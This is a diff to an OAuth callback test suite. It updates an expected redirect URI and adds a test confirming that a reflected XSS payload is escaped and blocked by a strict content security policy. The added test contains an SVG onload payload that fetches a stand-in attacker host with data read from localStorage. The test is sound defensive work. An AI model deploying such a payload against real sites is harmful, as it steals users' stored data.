@@ -195,7 +195,9 @@ describe('mcp 托管 OAuth:授权全链路(默认离线,上游为 fetch mock)', 
     expect(authUrl.origin).toBe('https://mcp-oauth.test')
     expect(authUrl.searchParams.get('client_id')).toBe('dcr-client-1')
     expect(authUrl.searchParams.get('code_challenge_method')).toBe('S256')
-    expect(authUrl.searchParams.get('redirect_uri')).toBe('https://tb.test/~oauth/callback')
+    expect(authUrl.searchParams.get('redirect_uri')).toBe(
+      'https://tool-bridge.pdjjq.org/~oauth/callback',
+    )
     const state = authUrl.searchParams.get('state')
     expect(state).toBeTruthy()
 
@@ -319,6 +321,24 @@ describe('mcp 托管 OAuth:拒绝路径', () => {
     vi.stubGlobal('fetch', upstream.fetchMock)
     const cb = await callback({ error: 'access_denied', state: 'whatever' })
     expect(cb.status).toBe(400)
+    expect(upstream.grants).toHaveLength(0)
+  })
+
+  it('AS 回跳 error 含 HTML → 转义后展示,不落地为可执行标记(反射型 XSS 防护)', async () => {
+    const upstream = oauthUpstreamMock([])
+    vi.stubGlobal('fetch', upstream.fetchMock)
+    const cb = await callback({
+      error: `<svg/onload=fetch('https://evil.test/'+localStorage.getItem('tb.profiles'))>`,
+      state: 'whatever',
+    })
+    expect(cb.status).toBe(400)
+    const html = await cb.text()
+    // 原始注入标记不得出现;应为转义实体。
+    expect(html).not.toContain('<svg/onload=')
+    expect(html).toContain('&lt;svg/onload=')
+    // 回调页必须带严格 CSP(即便有遗漏注入点也不放行脚本执行)。
+    expect(cb.headers.get('content-security-policy')).toContain('default-src \'none\'')
+    expect(cb.headers.get('cache-control')).toBe('no-store')
     expect(upstream.grants).toHaveLength(0)
   })
 
